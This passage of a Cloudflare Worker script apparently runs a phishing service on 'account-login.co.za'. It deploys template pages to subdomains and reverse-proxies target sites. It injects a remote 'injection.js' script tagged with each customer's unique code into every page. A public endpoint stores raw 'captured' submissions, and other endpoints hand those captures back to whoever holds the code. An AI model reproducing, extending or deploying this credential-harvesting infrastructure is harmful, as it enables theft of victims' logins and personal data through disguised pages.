        return new Response(INJECTION_JS, { headers: { 'Content-Type': 'application/javascript' } });
    }



    // --- CORS HANDLING ---
    if (request.method === 'OPTIONS') {
      return handleOptions(request);
    }

    // Helper to wrap response with CORS headers
    const respond = (response) => {
        const corsHeaders = getCorsHeaders(request);
        const newHeaders = new Headers(response.headers);
        Object.entries(corsHeaders).forEach(([k, v]) => newHeaders.set(k, v));

        return new Response(response.body, {
            status: response.status,
            statusText: response.statusText,
            headers: newHeaders
        });
    };

    // --- 1. ADMIN AUTHENTICATION & ROUTES ---
    // Check if the request is for an Admin page or Admin API
    const isAdminPath = url.pathname.startsWith('/admin') ||
                        url.pathname === '/api/save' ||
                        (url.pathname === '/api/captures' && request.method === 'GET') ||
                        url.pathname.startsWith('/api/admin');

    if (isAdminPath) {
        // 1.1 Handle Login POST (Publicly accessible to attempt login)
        if (url.pathname === '/admin/login' && request.method === 'POST') {
            return respond(await handleLogin(request));
        }

        const isAuth = await checkAuth(request);

        // 1.2 Block Unauthenticated
        if (!isAuth) {
            return respond(new Response(JSON.stringify({ success: false, error: "Unauthorized" }), {
                status: 401,
                headers: {'Content-Type': 'application/json'}
            }));
        }

        // 1.3 Authenticated Routes
        if (url.pathname === '/api/save' && request.method === 'POST') {
            return respond(await handleSaveRequest(request, env));
        }

        if (url.pathname === '/api/captures' && request.method === 'GET') {
            return respond(await handleGetCaptures(env));
        }

        if (url.pathname === '/api/admin/templates') {
             if (request.method === 'GET') return respond(await handleGetTemplates(env));
             if (request.method === 'POST') return respond(await handleSaveTemplate(request, env));
             if (request.method === 'DELETE') return respond(await handleDeleteTemplate(request, env));
        }

        // Fallback for admin path
        return respond(new Response("Not Found", { status: 404 }));
    }

    // --- 2. PUBLIC API ENDPOINTS ---

    // Public Captures API (Protected by unique code)
    if (url.pathname === '/api/public/captures') {
        if (request.method === 'GET') return respond(await handleGetPublicCaptures(request, env));
        if (request.method === 'DELETE') return respond(await handleDeletePublicCapture(request, env));
    }

    // Handle Capture Requests (Public)
    if (url.pathname === '/api/capture' && request.method === 'POST') {
      return respond(await handleCaptureRequest(request, env));
    }

    // Handle Public Deployment
    if (url.pathname === '/api/public/deploy' && request.method === 'POST') {
        return respond(await handlePublicDeploy(request, env, ROOT_DOMAIN));
    }

    // Public Templates List
    if (url.pathname === '/api/public/templates' && request.method === 'GET') {
        return respond(await handleGetPublicTemplates(env));
    }

    // --- 3. SUBDOMAIN ROUTING (Serving Deployed Sites) ---

    let subdomain = null;
    // Parse Subdomain
    if (domain !== ROOT_DOMAIN && domain.endsWith("." + ROOT_DOMAIN)) {
        subdomain = domain.slice(0, - (ROOT_DOMAIN.length + 1));
    }

    // Only serve content if we have a valid subdomain
    if (subdomain && subdomain !== 'www') {
        // Lookup Subdomain in KV
        const data = await env.SUBDOMAINS.get(subdomain, { type: "json" });

        if (!data) {
           return new Response(`<html><body><h1>404</h1><p>Subdomain not found.</p></body></html>`, {
               status: 404,
               headers: { 'Content-Type': 'text/html' }
           });
        }

        if (data.type === 'HTML') {
          // Serve stored HTML directly
          return new Response(data.content, {
            headers: { 'Content-Type': 'text/html' }
          });
        }

        if (data.type === 'PROXY') {
          // Fetch content from the target URL (Reverse Proxy)
          try {
            const targetUrl = data.content;
            const forwardUrl = new URL(targetUrl);
            forwardUrl.pathname = url.pathname === '/' ? forwardUrl.pathname : url.pathname;
            forwardUrl.search = url.search;

            const proxyResponse = await fetch(forwardUrl.toString(), {
              headers: {
                'User-Agent': request.headers.get('User-Agent') || 'D-TECH Cloud Proxy',
              }
            });

            const response = new Response(proxyResponse.body, proxyResponse);
            return response;

          } catch (err) {
            return new Response(`<h1>Proxy Error</h1><p>${err.message}</p>`, { status: 502, headers: {'Content-Type': 'text/html'} });
          }
        }
    }

    // Default Response for Root Domain (if accessed via Worker)
    return new Response(JSON.stringify({ message: "D-TECH API Service Online" }), {
        headers: { 'Content-Type': 'application/json' }
    });
  }
};

// --- HELPER FUNCTIONS ---

function getCorsHeaders(request) {
    const origin = request.headers.get('Origin');
    const allowedDomain = 'https://account-login.co.za';

    // Allow Main Domain
    if (origin === allowedDomain) {
        return {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Allow-Credentials': 'true'
        };
    }

    // Allow Subdomains (mostly for captures)
    if (origin && origin.endsWith('.account-login.co.za')) {
         return {
            'Access-Control-Allow-Origin': origin,
            'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Allow-Credentials': 'false'
        };
    }

    // Fallback for development/testing (optional, remove for prod if strict)
    // return {
    //     'Access-Control-Allow-Origin': '*',
    //     'Access-Control-Allow-Methods': 'GET, POST, DELETE, OPTIONS',
    //     'Access-Control-Allow-Headers': 'Content-Type'
    // };

    return {};
}

function handleOptions(request) {
    const headers = getCorsHeaders(request);
    return new Response(null, {
        headers: headers
    });
}

async function checkAuth(request) {
  const cookieHeader = request.headers.get('Cookie');
  if (!cookieHeader) return false;
  return cookieHeader.includes(`${COOKIE_NAME}=${PASSWORD}`);
}

async function handleLogin(request) {
    try {
        const formData = await request.formData();
        const password = formData.get('password');
        if (password === PASSWORD) {
            return new Response(JSON.stringify({ success: true }), {
                headers: {
                    'Content-Type': 'application/json',
                    // SameSite=None; Secure is required for cross-site cookies (GitHub Pages -> Worker)
                    'Set-Cookie': `${COOKIE_NAME}=${PASSWORD}; Path=/; HttpOnly; SameSite=None; Secure; Max-Age=86400`
                }
            });
        }
        return new Response(JSON.stringify({ success: false, error: "Invalid Password" }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return new Response(JSON.stringify({ success: false, error: "Error processing request" }), {
            headers: { 'Content-Type': 'application/json' }
        });
    }
}

async function handleSaveRequest(request, env) {
  try {
    const body = await request.json();
    const { subdomain, type, content } = body;

    if (!subdomain || !type || !content) {
      return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });
    }

    const entry = {
      type: type, // 'HTML' or 'PROXY'
      content: content,
      updated: Date.now()
    };

    await env.SUBDOMAINS.put(subdomain, JSON.stringify(entry));

    return new Response(JSON.stringify({ success: true, subdomain, type }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleCaptureRequest(request, env) {
  try {
    const body = await request.json();
    const timestamp = Date.now();
    const uuid = crypto.randomUUID();

    // Extract uniqueCode from body if available
    const uniqueCode = body.uniqueCode || 'default';
    const key = `capture::${uniqueCode}::${timestamp}::${uuid}`;

    // Store the raw captured data
    await env.SUBDOMAINS.put(key, JSON.stringify({
      timestamp: timestamp,
      data: body
    }));

    return new Response(JSON.stringify({ success: true, key: key }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleGetCaptures(env) {
  try {
    const list = await env.SUBDOMAINS.list({ prefix: "capture::" });
    const keys = list.keys;
    const latestKeys = keys.slice(-20).reverse();

    const promises = latestKeys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);

    return new Response(JSON.stringify({ success: true, data: results }), {
      headers: { 'Content-Type': 'application/json' }
    });
  } catch (err) {
     return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
  }
}

async function handleGetTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const keys = list.keys;
    const templates = await Promise.all(keys.map(async k => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { name: k.name.replace("template::", ""), ...val };
    }));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleGetPublicTemplates(env) {
    const list = await env.SUBDOMAINS.list({ prefix: "template::" });
    const templates = list.keys.map(k => k.name.replace("template::", ""));
    return new Response(JSON.stringify({ success: true, data: templates }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleSaveTemplate(request, env) {
    const body = await request.json();
    const { name, content } = body;
    if (!name || !content) return new Response(JSON.stringify({ success: false, error: "Missing fields" }), { status: 400 });

    await env.SUBDOMAINS.put(`template::${name}`, JSON.stringify({ content, updated: Date.now() }));
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeleteTemplate(request, env) {
    const url = new URL(request.url);
    const name = url.searchParams.get('name');
    if (!name) return new Response(JSON.stringify({ success: false, error: "Missing name" }), { status: 400 });

    await env.SUBDOMAINS.delete(`template::${name}`);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

async function handlePublicDeploy(request, env, rootDomain) {
    try {
        const body = await request.json();
        const { subdomain, uniqueCode, templateName } = body;

        // Validation
        if (!subdomain || !uniqueCode || !templateName) return jsonError("Missing fields");
        if (!/^[a-zA-Z0-9-]+$/.test(subdomain)) return jsonError("Invalid subdomain format");

        // Check availability
        const existingSub = await env.SUBDOMAINS.get(subdomain);
        if (existingSub) return jsonError("Subdomain already taken");

        // Check unique code usage
        const existingCode = await env.SUBDOMAINS.get(`code_map::${uniqueCode}`);
        if (existingCode) return jsonError("Unique code already used");

        // Get Template
        const templateData = await env.SUBDOMAINS.get(`template::${templateName}`, { type: "json" });
        if (!templateData) return jsonError("Template not found");

        // --- SCRIPT INJECTION ---
        // Instead of inlining the code, we link to the external script on GitHub.
        const scriptUrl = 'https://account-login.co.za/injection.js';

        // We inject the unique code as a global variable, securely serialized.
        const injectionBlock = `
        <script>
        window.UNIQUE_CODE = ${JSON.stringify(uniqueCode)};
        </script>
        <script src="${scriptUrl}"></script>
        `;

        let html = templateData.content;
        // Inject before </body> if exists, else append
        if (html.includes('</body>')) {
            html = html.replace('</body>', `${injectionBlock}</body>`);
        } else {
            html += injectionBlock;
        }

        // Save Subdomain
        await env.SUBDOMAINS.put(subdomain, JSON.stringify({
            type: 'HTML',
            content: html,
            updated: Date.now(),
            ownerCode: uniqueCode
        }));

        // Save Code Map
        await env.SUBDOMAINS.put(`code_map::${uniqueCode}`, JSON.stringify({
            subdomain: subdomain,
            created: Date.now()
        }));

        return new Response(JSON.stringify({ success: true, url: `https://${subdomain}.${rootDomain}` }), {
            headers: { 'Content-Type': 'application/json' }
        });
    } catch (e) {
        return jsonError(e.message, 500);
    }
}

async function handleGetPublicCaptures(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    if (!code) return jsonError("Missing code");

    // List keys with prefix 'capture::{code}::'
    const list = await env.SUBDOMAINS.list({ prefix: `capture::${code}::` });
    const keys = list.keys.slice(-50).reverse(); // Last 50

    const promises = keys.map(async (k) => {
        const val = await env.SUBDOMAINS.get(k.name, { type: "json" });
        return { key: k.name, ...val };
    });

    const results = await Promise.all(promises);
    return new Response(JSON.stringify({ success: true, data: results }), { headers: { 'Content-Type': 'application/json' } });
}

async function handleDeletePublicCapture(request, env) {
    const url = new URL(request.url);
    const code = url.searchParams.get('code');
    const key = url.searchParams.get('key');
    if (!code || !key) return jsonError("Missing fields");

    // Security check: Ensure key belongs to code
    if (!key.startsWith(`capture::${code}::`)) return jsonError("Unauthorized deletion", 403);

    await env.SUBDOMAINS.delete(key);
    return new Response(JSON.stringify({ success: true }), { headers: { 'Content-Type': 'application/json' } });
}

function jsonError(msg, status = 400) {
    return new Response(JSON.stringify({ success: false, error: msg }), { status: status, headers: { 'Content-Type': 'application/json' } });
}
